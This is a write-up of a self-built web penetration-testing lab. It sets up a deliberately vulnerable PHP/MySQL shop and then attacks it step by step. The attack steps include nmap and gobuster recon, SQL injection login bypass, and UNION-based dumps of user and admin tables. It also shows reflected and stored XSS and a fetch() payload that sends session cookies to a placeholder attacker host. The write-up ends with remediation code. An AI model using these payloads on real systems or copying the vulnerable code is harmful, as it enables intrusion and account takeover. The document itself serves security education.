# Full-Stack Web App Penetration Testing Lab

---

## Overview

This project simulates a real-world e-commerce environment designed to practice both offensive (Red Team) and defensive (Blue Team) cybersecurity techniques.

A full-stack web application was developed and deployed on dedicated hardware to replicate a production-like setup. The lab environment enables hands-on testing of vulnerabilities such as SQL Injection (SQLi), Cross-Site Scripting (XSS), and Session Hijacking.

The objective is to demonstrate the complete attack lifecycle—from reconnaissance and initial access to exploitation and post-exploitation—while highlighting how insecure coding practices can lead to full system compromise.

---

## 1. Secure Infrastructure & Engineering Objectives

- **Architect Environment Parity**  
  - Migrate and stabilize the University project schema onto a dedicated hardware node (HP ZBook) to ensure all PHP logic remains functional.

- **Implement Hardened Service Layers**  
  - Move away from default "out-of-the-box" configurations by deploying a standalone MySQL 8.0 instance with restricted service accounts.

- **Establish Data Integrity**  
-Provision and populate relational tables with high-fidelity data to verify frontend rendering and session tracking.

The tables include:
-users
-produktet (Albanian for products)
-admins
-shporta (Albanian for cart)

---

## 2. Security & Penetration Testing Objectives (Red Team)

- **Validate Network Connectivity**  
  - Confirm the Dell Latitude (Attacker) can successfully discover and enumerate services on the target via the lab subnet.

- **Assess Web Vulnerabilities**  
  - Identify and exploit common web flaws such as SQL Injection (SQLi) within login and search fields.

- **Simulate Credential Harvesting**  
  - Test the security of the user and admin databases through successful data dumping and password analysis.

- **Evaluate Information Disclosure**  
  - Analyze the risks associated with plaintext configuration files (CWE-522) and their impact on total system compromise.

---

## Lab Architecture (The Network Layout)

The lab is designed as a controlled *"Attacker vs. Victim"* environment within a private subnet,  
with a Kali Linux attacker machine targeting a hardened Windows 10 HP ZBook web server.

### 1. Attacker Machine: Dell Latitude 5530

- *OS:* Kali Linux
- *Role:* Penetration Testing Workstation

- *Primary Tools:*
  - Nmap (Recon)
  - Hydra (Brute Force)
  - Burp Suite (Proxy/Web Attacks)
  - SQLmap

### 2. Victim Machine (The Target): HP ZBook

- *OS:* Windows 10
- *Role:* Hardened Small-Business Web Server
- *Web Stack:*
  - Apache (via XAMPP) hosting the PayGearPlan e-commerce site.
- *Database:*
  - Standalone MySQL Community Server 8.0 (Isolated for security control)

---

# Phase 1: Environment Provisioning (XAMPP & MySQL)

---

- **Target Machine:** HP / Windows 10  
- **Objective:** Deploy a functional web and database environment with *Hardened service configurations* to simulate a production-ready victim.

---

## Environment Setup

- Replicated the original project schema to ensure full PHP functionality.
- Created core database tables for users, produktet, and session tables.
- Populated the database with realistic data to validate frontend behavior.

The environment was deployed on a dedicated HP ZBook with an Apache web server and a standalone MySQL backend, providing a stable and production-like setup for penetration testing.

---

## 1. XAMPP Deployment (The Web Layer)

- *Purpose*
  - Hosting the PHP front-end of the e-commerce application.

- *XAMPP Stack*
  - Installed to provide the Apache web server and PHP 8.x environment.

- *Web Root*
  - `C:\xampp\htdocs\PayGearPlan`

- *Configuration*
  - The Apache service was configured to listen on **Port 80**, allowing cross-network communication from the Kali Attacker machine.

<p align="center">
<a href="Screenshots\XAMPP.png">
<img src="Screenshots\XAMPP.png" width="700">
</a>
</p>

---

## 2. MySQL Community Server (The Database Layer)

Instead of using the default, insecure XAMPP database (MariaDB), a standalone **MySQL Community 8.0** instance was installed to implement higher security standards.

### Hardening Measures Applied

- *Service Authentication*
  - Upgraded from **No Password** to **Strong Password Authentication**.

- *Account Isolation*
  - Created a dedicated service account (`paygear_user`) instead of using the `root` superuser for application tasks.

- *Host Restriction*
  - Restricted the user to `localhost`.
  - This prevents *Low-Hanging Fruit* attacks where an attacker tries to log in to the database directly from the network.

- *Port Selection*
  - MySQL was configured to run on **Port 3306**, ensuring consistency with the web application connection settings and standard network practices.

---

## 3. Identity & Access Management (IAM)

The following credentials were established to connect the application to the data layer.

| Component         | Configuration                              |
|:-----------------:|:------------------------------------------:|
| **Database User** | `paygear_user`                             |
| **Password** 	    | `PenTester12!`                             |
| **Encryption**    | Configured with `mysql_native_password`    | 
| **Permissions**   | Data-only (SELECT, INSERT, UPDATE, DELETE) |

<p align="center">
<a href="Screenshots\Privileges_User_DB.png">
<img src="Screenshots\Privileges_User_DB.png" width="700">
</a>
</p>

<p align="center">
<a href="Screenshots\Apply_Configration.png">
<img src="Screenshots\Apply_Configration.png" width="700">
</a>
</p>

- **Port**

  - MySQL was configured to use **Port 3306** for all database connections, matching the web application configuration.

<p align="center">
<a href="Screenshots\Port_selection.png">
<img src="Screenshots\Port_selection.png" width="700">
</a>
</p>

---

## 4. Intentional Vulnerability: Information Disclosure

To facilitate the *Red Team* portion of the lab, a connection file was created in the web root.

In a real-world audit, this is classified as:

- **CWE-522: Insufficiently Protected Credentials**

- **File**

[View Python Script](Vulnerable_Source_Code/php/connection.php)

```php

<?php

// Securely configured for Localhost, but credentials are plain-text

$host = "localhost";

$user = "paygear_user";

$pass = "PenTester12!";

$db   = "paygearplanDB";



$conn = mysqli_connect($host, $user, $pass, $db);

?>

```

---

## Database Architecture & Provisioning

To ensure the website runs smoothly and is ready for **SQL injection and data harvesting simulations**, the following backend components were configured.

- *Database Engine*
  - MySQL 8.0 (Standalone)

- *Database Name*
  - `paygearplanDB`

- *Service Account*
  - `paygear_user`

  - Configured with `mysql_native_password` for application compatibility.


<p align="center">
<a href="Screenshots\Creating_the_back_door.png">
<img src="Screenshots\Creating_the_back_door.png" width="700">
</a>
</p>

---

## Environment Verification (Evidence)

This section documents the verification of the database setup, table contents, and user accounts.  

Each subsection includes a brief explanation, the SQL command used, and a screenshot placeholder showing the expected output.

---

### 1. Database & User Verification

> Verifying that the main database exists and that the service account is correctly provisioned.  

> The database was created using the following command:

- **Database Creation Command**

```sql

CREATE DATABASE paygearplanDB;

```

- **Verification Commands**

```sql

SHOW DATABASES;

SELECT user FROM mysql.user;

```

<p align="center">
<a href="Screenshots\Database_created.png">
<img src="Screenshots\Database_created.png" width="700">
</a>
</p>

---

### 2. Inventory Subsystem (produktet – Albanian word for "products")

> Ensuring that the inventory table contains all the required items, such as Solar Panels and GPUs, and that data is correctly stored.  

- **Table Creation Command**

```sql

CREATE TABLE produktet(

    id INT AUTO_INCREMENT PRIMARY KEY,

    emri VARCHAR(255) NOT NULL,

    cmimi int NOT NULL,

    imazhi VARCHAR(255)

);

```

- **Command**

```sql

SELECT * FROM products;

```

<p align="center">
<a href="Screenshots\Products_table.png">
<img src="Screenshots\Products_table.png" width="700">
</a>
</p>

---

### 3. Identity Management (users)

> Confirming that application user accounts are active and timestamps are correctly recorded for auditing purposes.  

- **Table Creation Command**

```sql

CREATE TABLE users (

    id INT AUTO_INCREMENT PRIMARY KEY,

    email VARCHAR(100),

    username VARCHAR(50) NOT NULL UNIQUE,

    password VARCHAR(255) NOT NULL,

    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,

    last_login_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP

);

```

- **Command**

```sql

SELECT * FROM users;

```

<p align="center">
<a href="Screenshots\Users_table.png">
<img src="Screenshots\Users_table.png" width="700">
</a>
</p>

---

### 4. Administrative Accounts (admins)

> Verifying privileged admin accounts that can access the website backend as developers.  

> Admins have full CRUD permissions (Create, Read, Update, Delete) to manage user information, inventory, and other sensitive data.  

> It is critical to verify these accounts for security and auditing purposes.  

- **Table Creation Command**

```sql

CREATE TABLE admins (

    id INT AUTO_INCREMENT PRIMARY KEY,

    email VARCHAR(50) NOT NULL UNIQUE,

    password VARCHAR(255) NOT NULL

);

```

- **Command**

```sql

SELECT * FROM admins;

```

<p align="center">
<a href="Screenshots\Admins_table.png">
<img src="Screenshots\Admins_table.png" width="700">
</a>
</p>

---

### 5. Session State Control (shporta - Albanian word for *cart*)

> Verifying that the session table is correctly structured for tracking shopping cart activity.  

- **Table Creation Command**

```sql

CREATE TABLE shporta (

    id INT AUTO_INCREMENT PRIMARY KEY,

    session_id INT,

    product_id INT,

    sasia INT DEFAULT 1

);

```

- **Command**

```sql

DESCRIBE shporta;

```

<p align="center">
<a href="Screenshots\shporta_table.png">
<img src="Screenshots\shporta_table.png" width="700">
</a>
</p>

---

## Pentester Lab Status: READY

The environment is stabilized and ready for the Red Team Phase.

---

Phase 2: Offensive Operations

---

# Stage 1: Reconnaissance & Intelligence Gathering

---

* Objective: Map the attack surface of the target system to identify open ports, exposed services, and the underlying web technology stack.

---

# Attack 1: Passive Reconnaissance (Technology Stack Analysis)

---

* Objective: Identify the specific versions of the web server and backend technologies (PHP, Apache, MySQL) without triggering intrusion detection systems.

* Tool: cURL

- Command Executed:

  curl -I http://[HP_LAPTOP_IP]/PayGearPlan/

# Result & Analysis

---

* Key Finding: The HTTP response headers successfully revealed the underlying server architecture.

* Target Environment: The `Server:` header indicates a technology stack running Apache (Win64) and PHP. Identifying exact version numbers allows for targeted searching in public vulnerability databases (CVEs).

<p align="center">
<a href="Screenshots\scaning_the_server.png">
<img src="Screenshots\scaning_the_server.png" width="700">
</a>
</p>

---

# Attack 2: Active Service Scanning

---

* Objective: Enumerate open ports, identify running services, and map the target attack surface.

* Tool: Nmap

- Command Executed:

  sudo nmap -sV -sC -A -p- [HP_LAPTOP_IP]

- Parameter Breakdown:

  * -sV : Service version detection (identifies MySQL version).

  * -sC : Default vulnerability script scanning.

  * -p- : Comprehensive 65,535 port scan.

  * -A  : Aggressive OS detection, version detection, and traceroute.

# Result & Analysis

* Key Finding: Port 3306/tcp (MySQL) is open and actively listening to external network traffic.

* Status: "3306/tcp open mysql MySQL (unauthorized)"

* Security Impact: Exposing Port 3306 directly to the external network (instead of localhost 127.0.0.1) is a critical architectural misconfiguration. Furthermore, identifying that it is configured with `mysql_native_password` provides specific context for authentication mechanics. This provides a direct vector for remote brute-force attacks and credential stuffing.

* Targeting: Port 3306/tcp is documented as the primary entry point for Remote Database Access (Reference: Attack 10).

<p align="center">
<a href="Screenshots\Nmap_scaning_port.png">
<img src="Screenshots\Nmap_scaning_port.png" width="700">
</a>
</p>

---

# Attack 3: Directory Brute-Forcing

---

* Objective: Discover hidden directories and sensitive backend configuration files that are not linked publicly.

* Tool: Gobuster

- Command Executed (Standard Directory Scan):

  gobuster dir -u http://[HP_LAPTOP_IP]/PayGearPlan/ -w /usr/share/wordlists/dirb/common.txt

<p align="center">
<a href="Screenshots\find_folders.png">
<img src="Screenshots\find_folders.png" width="700">
</a>
</p>

<p align="center">
<a href="Screenshots\find_folders_2.png">
<img src="Screenshots\find_folders_2.png" width="700">
</a>
</p>

- Command Executed (Targeted File Extensions):

  gobuster dir -u http://[HP_LAPTOP_IP]/PayGearPlan/php/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak -t 50

# Result & Analysis

* Key Finding: Discovered hidden infrastructure, specifically the `/php/` directory and sensitive backend files.

* Security Impact: Bypassing security by obscurity allows an attacker to map the internal structure of the web application, paving the way for targeted exploitation of specific PHP scripts and configuration files.

<p align="center">
<a href="Screenshots\finding_files.png">
<img src="Screenshots\finding_files.png" width="700">
</a>
</p>

<p align="center">
<a href="Screenshots\finding_files_2.png">
<img src="Screenshots\finding_files_2.png" width="700">
</a>
</p>

---

# Stage 2: Initial Access (Breaking In)

---

# Attack 4: Information Disclosure (CWE-522)

---

* Objective: Exploit exposed configuration files to extract database connection logic and backend parameters.

* Target: http://[HP_IP]/PayGearPlan/php/lidhjaDatabazes.php

- Execution:

  * Navigated to the discovered target URL.

  * Inspected the raw page source code (Ctrl + U).

  * Simulated the discovery of a misconfigured server or exposed backup file (e.g., connection.php.bak).

# Result & Analysis

* Vulnerability: CWE-522 (Insufficiently Protected Credentials / Sensitive Data Exposure).

* Security Impact: The database connection logic and the specific database name were successfully extracted. Providing public access to configuration files grants an attacker the necessary intelligence to map the backend and attempt direct database connections.

<p align="center">
<a href="Screenshots\conencting_to_the_port.png">
<img src="Screenshots\conencting_to_the_port.png" width="700">
</a>
</p>

---

# Attack 5: User Authentication Bypass Attempt (SQLi)

---

* Objective: Attempt to bypass the primary user authentication portal using SQL Injection to force the database to ignore the password requirement.

- Execution:

  * Target: User Login Portal

  * Payload (Username): admin' -- 

  * Payload (Password): [Left completely empty]

- Target Source Code Encountered:

  $stmt = $conn->prepare("SELECT id FROM users WHERE username = ? AND password = ?");

  $stmt->bind_param("ss", $username, $password);

  $stmt->execute();

# Result & Analysis

* Status: Attack FAILED.

* Query Execution: SELECT id FROM users WHERE username = "admin' -- " AND password = ""

* Security Impact: The application successfully neutralized the injection and denied access. Because the backend utilizes MySQLi Prepared Statements, the database treated the payload as a literal text string rather than an executable command. The system searched for a user literally named "admin' --", found zero matches, and triggered the "Incorrect credentials" alert.

<p align="center">
<a href="Screenshots\failed_login.png">
<img src="Screenshots\failed_login.png" width="700">
</a>
</p>

---

# Attack 6: Administrative Authentication Bypass (SQLi)

---

* Objective: Exploit dynamic SQL concatenation to manipulate the database logic and bypass administrative authentication without valid credentials.

- Execution:

  * Target: Administrative Login Portal

  * Payload (Email): ' OR 1=1 -- 

  * Payload (Password): [Left blank]

- Vulnerable Source Code Encountered:

  $sql = "SELECT id FROM admins WHERE email = '$email' AND password = '$password'";

# Result & Analysis

* Status: Attack SUCCEEDED.

* Query Execution: SELECT id FROM admins WHERE email = '' OR 1=1 -- ' AND password = '...'

* Security Impact: The application uses dynamic SQL by placing raw user input directly into the query string. The injected payload forces the query condition to evaluate as TRUE (1=1) and uses the comment sequence (-- ) to ignore the password requirement entirely. This bypasses the authentication mechanism, granting the attacker full, unauthorized access to the Admin Dashboard and allowing the exfiltration of all user information.

<p align="center">
<a href="Screenshots\Admin_dashboard.png">
<img src="Screenshots\Admin_dashboard.png" width="700">
</a>
</p>

---

# Stage 3: Exploitation & Data Exfiltration

---

# Attack 7: Database Dumping (UNION-based SQLi)

---

* Objective: Exploit an un-sanitized search input to append a malicious database query and exfiltrate the contents of the entire users table.

* Target: http://[HP_IP]/PayGearPlan/produktet.php (Product Search Bar)

- Concept: 

  * A UNION-based SQL injection forces the database to combine the results of the application's original query with a new, attacker-defined query. If the column counts match, the stolen data is seamlessly rendered on the frontend.

- Vulnerable Source Code Encountered:

  <form method="GET" action="produktet.php">

      <input type="text" name="search" placeholder="Search for a product...">

  </form>

  * Note: The backend PHP directly concatenates the `search` parameter into the SQL query without utilizing Prepared Statements.

- Execution:

  * Payload Entered: ' UNION SELECT 1, username, password, 'default.jpg' FROM users -- a

- Payload Breakdown:

  * ' : Breaks out of the original query structure.

  * UNION SELECT : Instructs the database to append a second query.

  * 1, username, password, 'default.jpg' : Extracts sensitive data while perfectly matching the original query's 4-column requirement.

  * FROM users : Targets the standard user table.

  * -- a : Comments out the remainder of the original query to prevent syntax errors.

# Result & Analysis

* Status: Attack SUCCEEDED.

* Security Impact: The database executed the combined query. The frontend application rendered the exfiltrated data as standard content. The entire `users` table, including usernames and hashed passwords, was successfully exposed directly on the product search page.

<p align="center">
<a href="Screenshots\users_fetched.png">
<img src="Screenshots\Admin_dashboard.png" width="700">
</a>
</p>

<p align="center">
<a href="Screenshots\users_fetch_2.png">
<img src="Screenshots\users_fetch_2.png" width="700">
</a>
</p>

---

# Attack 8: Cross-Site Scripting (XSS) in Product Reviews

---

* Objective: Inject malicious JavaScript into a persistent database field to execute code in the browser of any user viewing the compromised page.

* Target: http://[HP_IP]/PayGearPlan/produktet.php (Product Review Submission)

- Concept: 

  * Stored XSS occurs when an application stores un-sanitized user input in a database and subsequently renders it to other users. This allows an attacker to execute client-side scripts to harvest session cookies or force malicious redirection.

- Vulnerable Source Code Encountered:

  <?php 

  if(isset($_POST['review_text']) && !empty($_POST['review_text'])) {

      echo "<b>Recent Review:</b><br><br>";

      echo $_POST['review_text']; // DIRTY CODE: Raw input echoed directly to the browser

  }

  ?>

- Execution:

  * Payload Entered: This laptop is great! <script>alert('CRITICAL VULNERABILITY: Session Cookie Exfiltrated!\n\n' + document.cookie);</script>

- Payload Breakdown:

  * This laptop is great! : Legitimate text to disguise the payload.

  * <script> : Initiates JavaScript execution.

  * document.cookie : Retrieves the active session cookie of the user viewing the page.

# Result & Analysis

* Status: Attack SUCCEEDED.

* Security Impact: The injected script was permanently stored in the database. Upon page load, the browser executed the script, triggering a pop-up that displayed the active `PHPSESSID` cookie. This vulnerability provides a direct vector for complete session hijacking of any user, including Administrators.

<p align="center">
<a href="Screenshots\Cookie_stolen.png">
<img src="Screenshots\Cookie_stolen.png" width="700">
</a>
</p>

---

# Attack 9: Sensitive Data Harvesting (Admin Credentials)

---

* Objective: Escalate the UNION-based SQL injection to target high-value administrative tables for offline password cracking.

* Target: http://[HP_IP]/PayGearPlan/produktet.php (Product Search Bar)

- Concept: 

  * Building upon the vulnerability verified in Attack 7, the target table is shifted from standard users to administrative accounts to harvest elevated credentials.

- Execution:

  * Payload Entered: ' UNION SELECT 1, email, password, 'default.jpg' FROM admins -- a

- Payload Breakdown:

  * Identical structure to Attack 7, but targets the `admins` table to extract the `email` and `password` columns.

# Result & Analysis

* Status: Attack SUCCEEDED.

* Security Impact: The application successfully extracted and rendered administrative credentials. Admin email addresses were displayed within the frontend "product name" fields, and administrative password hashes were displayed in the "product price" fields. These hashes can now be exported for offline cryptographic cracking (e.g., via Hashcat).

<p align="center">
<a href="Screenshots\admins_fetch.png">
<img src="Screenshots\admins_fetch.png" width="700">
</a>
</p>

---

# Stage 4: Post-Exploitation & Lateral Movement

---

# Attack 10: Reflected Cross-Site Scripting (XSS)

---

* Objective: Inject executable JavaScript into a non-persistent input field to execute code within a victim's active session.

* Target: http://[HP_IP]/PayGearPlan/produktet.php (Product Search Bar)

- Concept:

  * Reflected XSS occurs when user input is immediately returned (reflected) by the server without proper output sanitization. The malicious script is not stored in the database but is executed when a victim clicks a crafted link or submits a payload.

- Vulnerable Source Code Encountered:

  <form method="GET" action="produktet.php">

      <input type="text" name="search" placeholder="Search for a product...">

  </form>

  
  <?php

  if (isset($_GET['search'])) {

      echo "<h3>Search Results for: " . $_GET['search'] . "</h3>";

  }

  ?>



- Execution:

  * Payload Entered: <script>alert('Reflected XSS Vulnerability - Admin Session Compromised!')</script>

# Result & Analysis

* Status: Attack SUCCEEDED.

* Security Impact: The payload was immediately reflected by the server and executed within the browser context. A popup alert appeared confirming arbitrary JavaScript execution. This vulnerability allows an attacker to craft malicious links that, if clicked by an authenticated user, can compromise their active session.

<p align="center">
<a href="Screenshots\Injection_admin_XSS.png">
<img src="Screenshots\Injection_admin_XSS.png" width="700">
</a>
</p>

---

# Attack 11: Stored Cross-Site Scripting (XSS)

---

* Objective: Inject malicious JavaScript into a persistent database field to affect all users who subsequently view the compromised page.

* Target: http://[HP_IP]/PayGearPlan/produktet.php (Product Reviews)

- Concept:

  * Stored XSS occurs when user input is saved in the database without sanitization. The malicious script is automatically executed whenever the page is loaded by any user, creating a permanent, silent threat.

- Vulnerable Source Code Encountered:

  <?php

  $review = $row['user_review'];

  echo "<div class='review-box'>";

  echo "<p>" . $review . "</p>"; // DIRTY CODE: Raw database output

  echo "</div>";

  ?>

- Execution:

  * Payload Entered: Great product! <script>alert('Stored XSS')</script>

# Result & Analysis

* Status: Attack SUCCEEDED.

* Security Impact: The payload was permanently stored in the database. Every user who views the affected product page automatically executes the injected script. A popup alert confirmed the vulnerability, establishing a persistent foothold for client-side attacks across the application.

<p align="center">
<a href="Screenshots\Posening_database.png">
<img src="Screenshots\Posening_database.png" width="700">
</a>
</p>

---

# Attack 12: Session Hijacking via Stored XSS (Weaponization)

---

* Objective: Weaponize the Stored XSS vulnerability to extract administrative session cookies and perform a complete account takeover.
* Target: http://[HP_IP]/PayGearPlan/produktet.php (Product Reviews)

- Concept:
  * Session hijacking occurs when an attacker steals a valid session identifier. By combining a Stored XSS vulnerability with an insecure cookie configuration, attackers can use JavaScript to silently extract the `document.cookie` object and transmit it to an external listening server.

- Vulnerability Verification:
  * Exploitation relies on the Stored XSS vector identified in Attack 11.
  * Environmental Weakness: The `PHPSESSID` session cookie is not protected with the `HttpOnly` flag, making it completely accessible to client-side JavaScript.

### Execution Step 1: Establishing the Command & Control Listener
A Python-based HTTP server was initialized on the Kali Linux attacker machine to act as a listener, ready to catch the incoming cookie transmission over port 8000.

<p align="center">
<a href="Screenshots\open_server_on_kali.png">
<img src="Screenshots\open_server_on_kali.png" width="700">
</a>
</p>

### Execution Step 2: Injecting the Weaponized Payload
The malicious JavaScript was injected into the persistent database via the Product Review submission form. 

  * Payload Entered: `Great product! <script>fetch('http://<KALI_IP>:8000/?cookie=' + document.cookie)</script>`

<p align="center">
<a href="Screenshots\script_on_web.png">
<img src="Screenshots\script_on_web.png" width="700">
</a>
</p>

### Execution Step 3: Triggering the Exploit & Data Exfiltration
Because the payload utilizes the `fetch()` API, the attack is completely invisible to the victim. There are no pop-up alerts. When the target user (or Administrator) navigates to the compromised page, their browser silently executes the script in the background.

<p align="center">
<a href="Screenshots\cookies_stoled.png">
<img src="Screenshots\cookies_stoled.png" width="700">
</a>
</p>

# Result & Analysis

* Status: Attack SUCCEEDED.
* Security Impact: The victim's `PHPSESSID` cookie was successfully extracted and beamed across the network to the attacker's remote listener. The attacker can now inject this stolen cookie directly into their own browser to fully hijack the administrative session, completely bypassing the login page and all password authentication mechanisms.

---

# Phase 3: Defensive Operations & Remediation

---

* Objective: Outline critical patches and architectural changes required to secure the PayGearPlan application against the exploited vulnerabilities.

# 1. Patching Infrastructure & Configuration (Recon Defenses)

---

* The Flaw: The MySQL database (Port 3306) is exposed to the external network, and sensitive backend directories (`/php/`) are accessible via brute-forcing.

* The Fix: Bind the database strictly to the local loopback address, and restrict direct web access to configuration files.

- Architectural Patches:

  * Database Binding: Edit the `my.ini` or `mysqld.cnf` file to include `bind-address = 127.0.0.1`. This ensures the database only accepts connections from the local web server, neutralizing remote attacks.

  * Directory Protection: Move sensitive files like `lidhjaDatabazes.php` completely outside the public `htdocs` or `www` root directory, or use an `.htaccess` file to explicitly "Deny from all" for the `/php/` folder.


# 2. Patching SQL Injection (Authentication Bypass & Data Dumping)

---

* The Flaw: The application concatenates raw user input directly into SQL queries without sanitization (Exploited in Attacks 6, 7, and 9).

* The Fix: Implement Prepared Statements to force the database to treat input strictly as data parameters, preventing arbitrary code execution.



- Updated Secure Code (PHP - Login & Search):

  $sql = "SELECT id FROM admins WHERE email = ? AND password = ?";

  $stmt = $conn->prepare($sql);

  $stmt->bind_param("ss", $email, $password);

  $stmt->execute();


# 3. Patching Cross-Site Scripting (Reflected & Stored XSS)

---

* The Flaw: The application renders user-submitted text (like product searches and reviews) directly to the browser without output encoding (Exploited in Attacks 8, 10, and 11).

* The Fix: Pass all user-generated content through PHP's `htmlspecialchars()` function before echoing it to the screen.



- Updated Secure Code (PHP - Output Rendering):

  // Sanitize the output before it hits the browser

  $safe_output = htmlspecialchars($raw_user_input, ENT_QUOTES, 'UTF-8');

  echo "<p>" . $safe_output . "</p>"; 

# 4. Patching Session Hijacking (Cookie Theft)

---

* The Flaw: The PHP Session cookie (`PHPSESSID`) is accessible to client-side JavaScript, allowing extraction via XSS payloads (Exploited in Attack 12).

* The Fix: Enable the `HttpOnly` flag for all session cookies to strictly hide them from any JavaScript execution, neutralizing the `document.cookie` theft vector.



- Updated Secure Code (PHP Global Configuration):

  // Force session cookies to be HttpOnly 

  ini_set('session.cookie_httponly', 1);

  session_start();



---



## ⚠️ Disclaimer



This lab environment is strictly for educational purposes within an isolated and controlled network.



Do not replicate these configurations or execute these attacks against live or production environments without explicit, written authorization.